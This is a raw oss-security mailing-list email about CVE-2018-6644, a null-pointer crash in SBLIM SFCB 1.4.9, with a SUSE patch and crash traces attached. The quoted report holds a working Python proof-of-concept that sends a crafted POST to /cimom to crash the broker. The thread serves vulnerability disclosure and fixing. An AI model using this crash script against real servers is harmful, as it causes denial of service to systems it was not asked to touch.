X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6694" "Friday" "9" "February" "2018" "10:34:44" "+0100" "Marcus Meissner" "meissner@suse.de" "<20180209093444.vkebhw75m53ucd4n@suse.de>" "199" "Re: [oss-security] Fw:Re: [scr459004] sfcb - 1.4.9" nil nil nil "2" "2018020909:34:44" "[oss-security] Fw:Re: [scr459004] sfcb - 1.4.9" (number mark "U       meissner@sus Feb  9  199/6694  " thread-indent "\"Re: [oss-security] Fw:Re: [scr459004] sfcb - 1.4.9\"\n") "<3f4673f3.2322.1616ea675cc.Coremail.hxl1999@yeah.net>" ("<3f4673f3.2322.1616ea675cc.Coremail.hxl1999@yeah.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1922 invoked by uid 550); 9 Feb 2018 09:34:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1904 invoked from network); 9 Feb 2018 09:34:56 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Fri, 9 Feb 2018 10:34:44 +0100
From: Marcus Meissner <meissner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20180209093444.vkebhw75m53ucd4n@suse.de>
References: <3f4673f3.2322.1616ea675cc.Coremail.hxl1999@yeah.net>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="dmf2aesdipgjtqpz"
Content-Disposition: inline
In-Reply-To: <3f4673f3.2322.1616ea675cc.Coremail.hxl1999@yeah.net>
Organization: SUSE Linux GmbH, GF: =?iso-8859-1?Q?Felix_?=
 =?iso-8859-1?Q?Imend=F6rffer=2C_Jane_Smithard=2C_Graham_Norton=2C_HRB_212?=
 =?iso-8859-1?Q?84_=28AG_N=FCrnberg=29?=
User-Agent: NeoMutt/20170421 (1.8.2)
Subject: Re: [oss-security] Fw:Re: [scr459004] sfcb - 1.4.9

--dmf2aesdipgjtqpz
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi,

Patch from our sblim-sfcb maintainer Adam Majer to fix this issue is attached.

Ciao, Marcus

On Wed, Feb 07, 2018 at 01:04:18PM +0800, XinleiHe wrote:
> 
> 
> 
> 
> 
> 
> 
> 
> 
> 
> -------- Forwarding messages --------
> From: cve-request@mitre.org
> Date: 2018-02-06 04:11:55
> To:  hxl1999@yeah.net
> Cc:  cve-request@mitre.org
> Subject: Re: [scr459004] sfcb - 1.4.9
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA256
> 
> The CVE ID is below. Please inform the software maintainer that the
> CVE ID has been assigned.
> 
> 
> > [Suggested description]
> > SBLIM Small Footprint CIM Broker (SFCB) 1.4.9 has a
> > null pointer (DoS) vulnerability via
> > a crafted POST request to the /cimom URI.
> > 
> > ------------------------------------------
> > 
> > [Additional Information]
> > You can use following python code to reproduce this vulnerability.
> > 
> > import httplib
> > from xml.dom.minidom import Document
> > class write_xml(Document):
> >     def __init__(self):
> > 
> >         Document.__init__(self)
> >  
> >     def set_tag(self,tag):
> >         self.tag = tag
> >         self.cim = self.createElement(self.tag)
> >         #self.setAttribute("encoding", "utf-8")
> >         
> >         self.cim.setAttribute("CIMVERSION", "2.0")
> >         self.cim.setAttribute("DTDVERSION", "2.0")
> >         self.appendChild(self.cim)
> > 
> >         self.msg = self.createElement("MESSAGE")
> >         self.msg.setAttribute("ID", "4711")
> >         self.msg.setAttribute("PROTOCOLVERSION","1.0")
> >         self.cim.appendChild(self.msg)
> > 
> >         self.sim = self.createElement("SIMPLEREQ")
> >         self.msg.appendChild(self.sim)
> > 
> >         self.ime = self.createElement("IMETHODCALL")
> >         self.ime.setAttribute("NAME","EnumerateInstances")
> >         self.sim.appendChild(self.ime)
> > 
> >         self.local = self.createElement("LOCALNAMESPACEPATH")
> >         self.ime.appendChild(self.local)
> >           
> >         self.names1=self.createElement("NAMESPACE")
> >         self.names1.setAttribute("NAME", "root")
> >         self.local.appendChild(self.names1)
> > 
> >     def display(self):
> >         print self.toprettyxml(indent="   ")
> >     def retdata(self):
> >         return self.toprettyxml(indent="   ")
> > 
> > def httpreq(data):
> >  conn = httplib.HTTPConnection("127.0.0.1", 5988, False)
> >  conn.request('POST', '/cimom',data)
> >  res = conn.getresponse() 
> > 
> > def main(): 
> >  wx = write_xml()
> >  wx.set_tag('CIM')
> >  print wx.retdata()
> >  print httpreq(wx.retdata())
> > 
> > if __name__=='__main__':
> >  main()
> > 
> > ------------------------------------------
> > 
> > [Vulnerability Type]
> > Buffer Overflow
> > 
> > ------------------------------------------
> > 
> > [Vendor of Product]
> > SBLIM project
> > 
> > ------------------------------------------
> > 
> > [Affected Product Code Base]
> > sfcb - 1.4.9
> > 
> > ------------------------------------------
> > 
> > [Impact Denial of Service]
> > true
> 
> Use CVE-2018-6644.
> 
> 
> - -- 
> CVE Assignment Team
> M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
> [ A PGP key is available for encrypted communications at
>   http://cve.mitre.org/cve/request_id.html ]
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1
> 
> iQIcBAEBCAAGBQJaeLorAAoJEHb/MwWLVhi2xdoP/2OaKyQzIatRABkB35IlzYpR
> vkjtDA8uXjMIcnuJr/sYa/zVFjIBRFQ2nLRkJs2d5Ni1uNsZ3hGm5A7Tn3RFsEby
> tL6CvtY8h0MBf4xf6ZVdkzwshJyb05qaOB7UfUL5Fskzoxvs2QpcbGKGtbtaKbPU
> YZq4t6aIyZW9UMEwheeCBDzGqC/oLVRUxgztgAy8SIhIlVfwtYEmHvafs11cN2XV
> EjVvIbaOeRlOfelJvlSKCOjHj0vjOesouiGlMLm3nqYXm5en/T66tuCpaajn4zzO
> I/Wj0Fm8tm2w0pkdfcNBewLu7+4bjRsiJ8U0SVPFQaOENvK7C3q6NyrfCgs1qesR
> fr4LS9TfOcuuIjxn9w3T0Hr4nOAJnSwTiwmnuKoQblA/Pn/r8CquyKh/Rh/ST6P7
> YxLUt9ZzXKf2SlWV1q+68N9RvefoXQFgQdAP2eUG0Y2i8ACZmxCPVLMclwUHvYIG
> KFlei2bIp4IADt3zRdndQBzEK1NwFhNwIKSnE7ybRQqFx6yTgoEiOP0CpYZLmRqi
> g94pvunSBKqPcCNhW/C78orO0Tz7UegnkaBMNYgIgW/jCFEiFGSBgi4VIjW8WWrr
> M+BM/UGehRBbGjmRqphsOBHdc1H9VKUAWJ0Y4hzQAd5Y6QCcTWb0uMlbNMjINshR
> 4TNbCFPf5EWJy7Bw8Gic
> =q5wy
> -----END PGP SIGNATURE-----

-- 
Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@suse.de>

--dmf2aesdipgjtqpz
Content-Type: text/x-patch; charset=us-ascii
Content-Disposition: attachment; filename="set_default_content_type.patch"

Author: Adam Majer <adam.majer@suse.de>
Summary: Fix crash caused by NULL content_type

Also, allow requests with Content-Type set to text/xml

==31976== Invalid read of size 1
==31976==    at 0x5883DEB: scanCimXmlRequest (cimXmlParserProcessed.c:1739)
==31976==    by 0x588C88E: handleCimRequest (cimRequest.c:1850)
==31976==    by 0x4E3D95A: doHttpRequest (httpAdapter.c:1399)
==31976==    by 0x4E3EC96: handleHttpRequest (httpAdapter.c:1741)
==31976==    by 0x4E3EC96: acceptRequest (httpAdapter.c:2022)
==31976==    by 0x4E40B0C: httpDaemon (httpAdapter.c:2464)
==31976==    by 0x404866: startHttpd (sfcBroker.c:540)
==31976==    by 0x4038B3: main (sfcBroker.c:1062)
==31976==  Address 0x0 is not stack'd, malloc'd or (recently) free'd
==31976== 
==31976== 
==31976== Process terminating with default action of signal 11 (SIGSEGV): dumping core
==31976==  Access not within mapped region at address 0x0
==31976==    at 0x5883DEB: scanCimXmlRequest (cimXmlParserProcessed.c:1739)
==31976==    by 0x588C88E: handleCimRequest (cimRequest.c:1850)
==31976==    by 0x4E3D95A: doHttpRequest (httpAdapter.c:1399)
==31976==    by 0x4E3EC96: handleHttpRequest (httpAdapter.c:1741)
==31976==    by 0x4E3EC96: acceptRequest (httpAdapter.c:2022)
==31976==    by 0x4E40B0C: httpDaemon (httpAdapter.c:2464)
==31976==    by 0x404866: startHttpd (sfcBroker.c:540)
==31976==    by 0x4038B3: main (sfcBroker.c:1062)

(gdb) p *ctx
$3 = {cimDoc = 0x69058c0 "", principal = 0x0, host = 0x69054d9 "xxx.xx.xxx.xxx:5989", contentType = 0x0, teTrailers = 0, 
  sessionId = 1, role = 0x0, cimDocLength = 0, commHndl = 0xffefffab0, chunkFncs = 0x5044798 <httpChunkFunctions>, 
  className = 0x0, operation = 0, verb = 0x6905480 "POST", path = 0x6905485 "/"}

Index: sblim-sfcb-1.4.8/httpAdapter.c
===================================================================
--- sblim-sfcb-1.4.8.orig/httpAdapter.c
+++ sblim-sfcb-1.4.8/httpAdapter.c
@@ -1047,7 +1047,7 @@ doHttpRequest(CommHndl conn_fd)
 
   inBuf.authorization = "";
   inBuf.protocol = "HTTP/1.1";
-  inBuf.content_type = NULL;
+  inBuf.content_type = "application/xml";
   inBuf.content_length = UINT_MAX;
   inBuf.host = NULL;
   inBuf.useragent = "";

--dmf2aesdipgjtqpz--
